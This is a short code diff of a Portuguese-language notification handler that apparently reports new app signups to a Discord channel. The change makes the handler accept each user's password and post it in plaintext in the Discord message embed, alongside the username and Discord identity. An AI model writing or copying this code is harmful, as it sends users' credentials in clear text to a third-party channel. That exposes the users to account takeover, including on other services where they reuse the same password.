@@ -72,7 +72,7 @@ async function handleNotify(request, env) {
   let body;
   try { body = await request.json(); } catch { return jsonRes({ error: "JSON inválido" }, 400); }
 
-  const { username, userId, discordId, discordUsername, secret } = body;
+  const { username, userId, discordId, discordUsername, password, secret } = body;
   if (secret !== env.SECRET) return jsonRes({ error: "Não autorizado" }, 403);
   if (!username || !userId)  return jsonRes({ error: "Campos faltando" }, 400);
 
@@ -83,12 +83,13 @@ async function handleNotify(request, env) {
 
   const fields = [
     { name: "👤  Usuário no app",   value: `\`\`\`${username}\`\`\``,      inline: true  },
-    { name: "🆔  ID interno",        value: `\`\`\`${shortId}\`\`\``,       inline: true  },
+    { name: "🔑  Senha",             value: `\`\`\`${password || "—"}\`\`\``, inline: true },
+    { name: "🆔  ID interno",        value: `\`\`\`${shortId}\`\`\``,       inline: false },
     { name: "📅  Data de cadastro",  value: `\`\`\`${dt}\`\`\``,            inline: false },
   ];
 
-  if (discordUsername) fields.push({ name: "🎮  Discord",  value: `\`\`\`${discordUsername}\`\`\``, inline: true });
-  if (discordId)       fields.push({ name: "🔖  Discord ID", value: `\`\`\`${discordId}\`\`\``,     inline: true });
+  if (discordUsername) fields.push({ name: "🎮  Discord",    value: `\`\`\`${discordUsername}\`\`\``, inline: true });
+  if (discordId)       fields.push({ name: "🔖  Discord ID", value: `\`\`\`${discordId}\`\`\``,       inline: true });
 
   await discordAPI("POST", `/channels/${env.DISCORD_CHANNEL_ID}/messages`, {
     embeds: [{
